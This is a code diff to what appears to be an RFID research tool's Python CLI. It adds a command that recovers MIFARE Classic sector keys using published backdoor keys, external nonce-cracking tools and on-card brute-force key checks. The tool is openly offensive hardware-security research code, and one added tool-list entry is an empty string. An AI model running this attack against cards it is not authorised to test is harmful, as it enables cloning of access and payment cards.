@@ -1,4 +1,6 @@
 import binascii
+import glob
+import math
 import os
 import tempfile
 import re
@@ -20,7 +22,8 @@ import hardnested_utils
 
 import chameleon_com
 import chameleon_cmd
-from chameleon_utils import ArgumentParserNoExit, ArgsParserError, UnexpectedResponseError
+from chameleon_utils import ArgumentParserNoExit, ArgsParserError, UnexpectedResponseError, execute_tool, \
+    tqdm_if_exists, print_key_table
 from chameleon_utils import CLITree
 from chameleon_utils import CR, CG, CB, CC, CY, C0
 from chameleon_utils import print_mem_dump
@@ -61,7 +64,7 @@ def load_dic_file(import_dic, keys):
 
 
 def check_tools():
-    tools = ['staticnested', 'nested', 'darkside', 'mfkey32v2']
+    tools = ['staticnested', 'nested', 'darkside', 'mfkey32v2', 'staticnested_1nt', 'staticnested_2x1nt_rf08s', '']
     if sys.platform == "win32":
         tools = [x+'.exe' for x in tools]
     missing_tools = [tool for tool in tools if not (default_cwd / tool).exists()]
@@ -1338,10 +1341,100 @@ class HFMFHardNested(ReaderRequiredUnit):
             print(f"{CR} - HardNested attack failed to recover the key.{C0}")
 
 
+@hf_mf.command('senested')
+class HFMFStaticEncryptedNested(ReaderRequiredUnit):
+    def args_parser(self) -> ArgumentParserNoExit:
+        parser = ArgumentParserNoExit()
+        parser.description = 'Mifare Classic static encrypted recover key via backdoor'
+        parser.add_argument(
+            '--key', '-k', help='Backdoor key (as hex[12] format), currently known: A396EFA4E24F (default), A31667A8CEC1, 518B3354E760. See https://eprint.iacr.org/2024/1275', metavar='<hex>', type=str, nargs='*')
+        parser.add_argument('--sectors', '-s', type=int, metavar="<dec>", help="Sector count")
+        parser.add_argument('--starting-sector', type=int, metavar="<dec>", help="Start recovery from this sector")
+        parser.set_defaults(sectors=16)
+        parser.set_defaults(starting_sector=0)
+        parser.set_defaults(key='A396EFA4E24F')
+        return parser
+
+    def on_exec(self, args: argparse.Namespace):
+        acquire_datas = self.cmd.mf1_static_encrypted_nested_acquire(
+            bytes.fromhex(args.key), args.sectors, args.starting_sector)
+
+        uid = format(acquire_datas['uid'], 'x')
+
+        key_map = {'A': {}, 'B': {}}
+
+        check_speed = 1.95  # sec per 64 keys
+
+        for sector in range(args.starting_sector, args.sectors):
+            sector_name = str(sector).zfill(2)
+            print('Recovering', sector, 'sector...')
+            execute_tool('staticnested_1nt', [uid, sector_name, format(acquire_datas['nts']['a'][sector]['nt'], 'x').zfill(8), format(
+                acquire_datas['nts']['a'][sector]['nt_enc'], 'x').zfill(8), str(acquire_datas['nts']['a'][sector]['parity']).zfill(4)])
+            execute_tool('staticnested_1nt', [uid, sector_name, format(acquire_datas['nts']['b'][sector]['nt'], 'x').zfill(8), format(
+                acquire_datas['nts']['b'][sector]['nt_enc'], 'x').zfill(8), str(acquire_datas['nts']['b'][sector]['parity']).zfill(4)])
+            a_key_dic = f"keys_{uid}_{sector_name}_{format(acquire_datas['nts']['a'][sector]['nt'], 'x').zfill(8)}.dic"
+            b_key_dic = f"keys_{uid}_{sector_name}_{format(acquire_datas['nts']['b'][sector]['nt'], 'x').zfill(8)}.dic"
+            execute_tool('staticnested_2x1nt_rf08s', [a_key_dic, b_key_dic])
+
+            keys = open(os.path.join(default_cwd, b_key_dic.replace('.dic', '_filtered.dic'))).readlines()
+            keys_bytes = []
+            for key in keys:
+                keys_bytes.append(bytes.fromhex(key.strip()))
+
+            key = None
+
+            print('Start checking possible B keys, will take up to', math.floor(
+                len(keys_bytes) / 64 * check_speed), 'seconds for', len(keys_bytes), 'keys')
+            for i in tqdm_if_exists(range(0, len(keys_bytes), 64)):
+                data = self.cmd.mf1_check_keys_on_block(sector * 4 + 3, 0x61, keys_bytes[i:i + 64])
+                if data:
+                    key = data.hex().zfill(12)
+                    key_map['B'][sector] = key
+                    print('Found B key', key)
+                    break
+
+            if key:
+                a_key = execute_tool('staticnested_2x1nt_rf08s_1key', [format(
+                    acquire_datas['nts']['b'][sector]['nt'], 'x').zfill(8), key, a_key_dic])
+                keys_bytes = []
+                for key in a_key.split('\n'):
+                    keys_bytes.append(bytes.fromhex(key.strip()))
+                data = self.cmd.mf1_check_keys_on_block(sector * 4 + 3, 0x60, keys_bytes)
+                if data:
+                    key = data.hex().zfill(12)
+                    print('Found A key', key)
+                    key_map['A'][sector] = key
+                    continue
+                else:
+                    print('Failed to find A key by fast method, trying all possible keys')
+                    keys = open(os.path.join(default_cwd, a_key_dic.replace('.dic', '_filtered.dic'))).readlines()
+                    keys_bytes = []
+                    for key in keys:
+                        keys_bytes.append(bytes.fromhex(key.strip()))
+
+                    print('Start checking possible A keys, will take up to', math.floor(
+                        len(keys_bytes) / 64 * check_speed), 'seconds for', len(keys_bytes), 'keys')
+                    for i in tqdm_if_exists(range(0, len(keys_bytes), 64)):
+                        data = self.cmd.mf1_check_keys_on_block(sector * 4 + 3, 0x60, keys_bytes[i:i + 64])
+                        if data:
+                            key = data.hex().zfill(12)
+                            print('Found A key', key)
+                            key_map['A'][sector] = key
+                            break
+            else:
+                print('Failed to find key')
+
+        for file in glob.glob(str(default_cwd) + '/*.dic'):
+            os.remove(file)
+
+        print_key_table(key_map)
+
+
 @hf_mf.command('fchk')
 class HFMFFCHK(ReaderRequiredUnit):
     def args_parser(self) -> ArgumentParserNoExit:
         parser = ArgumentParserNoExit()
+        parser.description = 'Mifare Classic fast key check on sectors'
 
         mifare_type_group = parser.add_mutually_exclusive_group()
         mifare_type_group.add_argument('--mini', help='MIFARE Classic Mini / S20',
